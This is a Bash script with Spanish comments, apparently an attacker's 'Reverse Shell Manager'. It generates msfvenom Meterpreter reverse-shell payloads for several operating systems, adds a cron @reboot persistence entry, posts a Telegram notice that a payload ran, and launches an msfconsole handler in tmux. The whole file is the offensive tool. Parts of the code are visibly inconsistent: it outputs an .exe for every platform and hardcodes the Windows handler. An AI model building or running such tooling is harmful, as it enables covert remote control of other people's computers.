
#!/bin/bash

# Colores para salida de texto
GREEN="\e[32m"
RED="\e[31m"
CYAN="\e[36m"
YELLOW="\e[33m"
RESET="\e[0m"

# Directorios y archivos esenciales
LOG_DIR="./logs"
PAYLOAD_DIR="./payloads"
CONFIG_FILE="./config.cfg"
STATS_FILE="./stats.log"
mkdir -p "$LOG_DIR" "$PAYLOAD_DIR"

# Dependencias requeridas
DEPENDENCIAS=("bash" "curl" "wget" "python3" "msfvenom" "tmux" "zenity" "jq")

# Verificar e instalar dependencias
check_dependencies() {
    echo -e "${CYAN}[INFO] Verificando dependencias...${RESET}"
    for dep in "${DEPENDENCIAS[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            echo -e "${YELLOW}[WARN] Falta dependencia: $dep. Instalando...${RESET}"
            sudo apt-get install -y "$dep" || echo -e "${RED}[ERROR] No se pudo instalar $dep.${RESET}"
        else
            echo -e "${GREEN}[OK] $dep está instalado.${RESET}"
        fi
    done
}

# Función para manejar el guardado de configuraciones
save_config() {
    echo -e "${CYAN}[INFO] Guardando configuración...${RESET}"
    cat > "$CONFIG_FILE" <<EOF
LHOST=$lhost
LPORT=$lport
PAYLOAD=$payload
EOF
}

# Generar payloads con msfvenom
generate_payload() {
    lhost=$(zenity --entry --title="LHOST" --text="Ingrese la IP de conexión:")
    lport=$(zenity --entry --title="LPORT" --text="Ingrese el puerto de conexión:")
    payload=$(zenity --list --title="Tipo de Payload" --column="Opción" --column="Payload"         1 "windows/meterpreter_reverse_tcp"         2 "linux/x64/meterpreter_reverse_tcp"         3 "android/meterpreter/reverse_tcp"         4 "osx/x64/meterpreter_reverse_tcp"         5 "generic/shell_reverse_tcp")

    msfvenom -p "$payload" LHOST="$lhost" LPORT="$lport" -f exe -o "$PAYLOAD_DIR/payload.exe"
    echo -e "${GREEN}[SUCCESS] Payload generado en $PAYLOAD_DIR/payload.exe${RESET}"

    save_config
}

# Función de persistencia avanzada
setup_persistence() {
    cronjob="@reboot $PAYLOAD_DIR/payload.exe"
    (crontab -l 2>/dev/null; echo "$cronjob") | crontab -
    echo -e "${GREEN}[SUCCESS] Persistencia configurada.${RESET}"
}

# Notificaciones de Telegram
send_telegram_notification() {
    token=$(zenity --entry --title="Token de Telegram" --text="Ingrese el token:")
    chat_id=$(zenity --entry --title="Chat ID" --text="Ingrese el ID de chat:")
    message="Payload ejecutado exitosamente."
    curl -s -X POST "https://api.telegram.org/bot${token}/sendMessage" -d "chat_id=${chat_id}&text=${message}"
    echo -e "${GREEN}[SUCCESS] Notificación enviada.${RESET}"
}

# Consola automática
start_reverse_shell() {
    tmux new-session -d -s reverse_shell "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter_reverse_tcp; set LHOST $lhost; set LPORT $lport; exploit'"
}

# Menú principal
main_menu() {
    while true; do
        clear
        echo -e "${CYAN}===========================${RESET}"
        echo -e "${GREEN} Reverse Shell Manager ${RESET}"
        echo -e "${CYAN}===========================${RESET}"
        echo -e "1. Verificar dependencias"
        echo -e "2. Generar payload"
        echo -e "3. Configurar persistencia"
        echo -e "4. Enviar notificación Telegram"
        echo -e "5. Iniciar consola automática"
        echo -e "6. Salir"
        read -p "Seleccione una opción: " option

        case $option in
            1) check_dependencies ;;
            2) generate_payload ;;
            3) setup_persistence ;;
            4) send_telegram_notification ;;
            5) start_reverse_shell ;;
            6) exit 0 ;;
            *) echo -e "${RED}Opción inválida.${RESET}" ;;
        esac
    done
}

main_menu
